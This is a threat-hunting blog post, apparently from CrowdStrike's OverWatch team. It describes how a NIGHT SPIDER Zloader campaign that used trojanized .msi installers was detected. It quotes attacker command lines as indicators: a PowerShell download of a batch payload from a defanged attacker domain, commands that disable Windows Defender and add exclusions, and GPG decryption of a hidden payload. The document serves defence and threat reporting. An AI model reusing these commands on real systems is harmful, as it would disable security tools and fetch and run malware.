Falcon OverWatch Threat Hunting Uncovers Ongoing NIGHT
SPIDER Zloader Campaign
March 14, 2022
Falcon OverWatch Team From The Front Lines

Over recent months, the CrowdStrike Falcon OverWatch™ team has tracked an ongoing,
widespread intrusion campaign leveraging bundled .msi installers to trick victims into
downloading malicious payloads alongside legitimate software. These payloads and scripts
were used to perform reconnaissance and ultimately download and execute NIGHT
SPIDER’s Zloader trojan, as detailed in CrowdStrike Falcon X™ Premium reporting. This
blog shows how OverWatch went about tracking and alerting customers to this activity,
despite the adversary’s attempts to evade detection.

Attempts to Hide Prove to Be the Key to Being Found
1/7

Whether it’s adopting new tools or new techniques, adversaries continuously iterate their
operations in an effort to stay a step ahead of defenders. What sets OverWatch apart is its
focus on detecting exactly this type of anomalous activity rather than relying on atomic and
static indicators to look for known threats.
Late in 2021, OverWatch detected a wave of activity leveraging bundled .msi installers to
execute scripts and remotely download additional malicious payloads. The initial installers
were masquerading as legitimate Zoom, Atera, NetSupport, Brave Browser, JavaPlugin and
TeamViewer installers, but the programs were also packaged with malicious scripts and
payloads to perform automated reconnaissance and download the Zloader trojan, and in
some cases, Cobalt Strike. The adversary’s use of evasive techniques was ultimately what
enabled OverWatch to quickly zero in on these attempted intrusions.

OverWatch’s detective capability against this campaign can be attributed to three pillars of
analysis that threat hunters use to rapidly assess hunting leads: behavior, prevalence and
timing. In the case of this campaign, OverWatch uncovered suspicious behaviors
associated with the use of native utilities, the presence of low-prevalence files and the
coincidence of both of these in a short time period impacting several customers. In fact, it
was the adversary’s attempts to evade detection that so quickly caught OverWatch’s
attention. The list that follows outlines the suspicious behaviors that OverWatch observed in
the analyzed Zloader campaign, which was developed by NIGHT SPIDER. The list also
shows example command lines related to these behaviors.
Numerous unknown scripts spawned from a low-prevalence binary packaged in highprevalence .msi files with well-known names (Team Viewer, Zoom, NetSupport
Manager, Atera, Brave Browser, JavaPlugin) and legitimate hashes.

The Microsoft Windows command or wscript utility used PowerShell to beacon to the
internet and remotely download a payload.
powershell Invoke-WebRequest
https[:]//clouds222[.]com/t1m/index/processingSetRequestBat2/?
servername=msi -OutFile flash.bat

The downloaded payload was a low-prevalence file.
The scripts used the Windows-native Mshta utility or PowerShell to impair Windows
Defender.
Powershell.exe -command “Set0MpPreference -DisableIOAVProtection $true”
powershell.exe -inputformat none -outputformat none -NonInteractive Command Add-MpPreference -ExclusionPath 'C:\Users\User\AppData\Roaming*'

The scripts used PowerShell in an attempt to bypass Microsoft’s AntiMalware Scan
Interface (AMSI).
The adminpriv.exe utility was used in an attempt to manipulate registry values.
adminpriv -U:T -ShowWindowMode:Hide reg add
"HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"
"Notification_Suppress" /t REG_DWORD /d "1" /f
adminpriv

-U:T -ShowWindowMode:Hide

sc delete

/v

windefend

MSIEXEC was used in an unusual manner to manipulate registry entries that would
suggest process abuse.
A script was used to issue a sleep command and decrypt a payload using the
legitimate GPG software. The same password was observed at various customers.
"C:\Users\[User]\AppData\Local\Temp\WScriptSleeper.vbs" 45000
CMD: PowerShell -NoProfile -ExecutionPolicy Bypass -command Import-Module
GnuPg; Remove-Encryption -FolderPath C:\Users\[REDACTED]\AppData\Roaming Password [REDACTED]
CMD: "C:\Program Files (x86)\GNU\GnuPG\gpg2.exe" --batch --yes -passphrase [REDACTED] -o C:\Users\[REDACTED]\AppData\Roaming\zoom.dll -d
C:\Users\[REDACTED]\AppData\Roaming\zoom.dll.gpg

Three Pillars of Rapid Assessment: Behavior, Prevalence and
Timing
OverWatch hunts for the last 1% of malicious activity that seeks to evade technology-based
defenses. To achieve this, threat hunters must build a picture not just from one or two data
points, but by carefully piecing together a myriad of subtle clues when something doesn’t
look quite right.

3/7

1. OverWatch hunts for unexpected behaviors stemming from otherwise mundane or
routine actions. This means threat hunters need a deep familiarity with the wide
variety of processes, applications, operating systems, configurations, network
communications and network architectures that represent the sum of normal day-today operations. Similarly, hunters need a deep understanding of adversary tradecraft,
exploits and the way that normal day-to-day operations can be manipulated for
malicious purposes. This breadth and depth of knowledge means that hunters can
rapidly identify anomalous behaviors by identifying activity that does not align with
expected intent or functionality of a system. In the case of the bundled installer
campaign, OverWatch observed an unidentified file attempting to bypass security on
more than one occasion, which immediately stood out as unusual.
2. Prevalence also plays an important role in threat hunting, as low-prevalence
behaviors can be indicative of a system being used for unintended purposes.
CrowdStrike Threat Graph® provides OverWatch with real-time visibility across the
entire Falcon platform install base, while patented tooling enables threat hunters to
immediately pivot on an indicator to determine whether it is common or not — not just
within one environment but across all environments. In scenarios where there is
suspicious behavior coupled with low-prevalence indicators, these two pillars provide
circumstantial findings to inform hunters’ analysis.
3. Time is the third pillar of threat hunting. Suspicious behavior and low-prevalence
indicators, all uncovered in a short period of time sound alarm bells for threat hunters.
This trifecta of activity can often indicate successful targeted phishing attempts, new
campaigns or the active exploitation of a zero-day in an application. In the example of
the Zloader malicious installer campaign, OverWatch’s extensive data and finely tuned
hunting leads effectively identified the coincidence of 8-10 suspicious behaviors all
within seconds of each other. This left hunters in no doubt that the activity was
malicious and enabled them to send timely and high-fidelity notifications to the victim
organizations.

Nowhere to Hide for NIGHT SPIDER
The powerful combination of the vast telemetry of the CrowdStrike Security Cloud and
OverWatch’s patented hunting workflows and expert threat hunters enabled the rapid
identification of NIGHT SPIDER’s Zloader campaign. The threat actor’s attempts to avoid
detection caught the attention of threat hunters who were able to quickly piece together the
evidence of a campaign in progress. Early detection of campaigns such as this enables
OverWatch to provide organizations with early warning about threats to their environment
and empowers organizations to remediate before any significant damage is done.
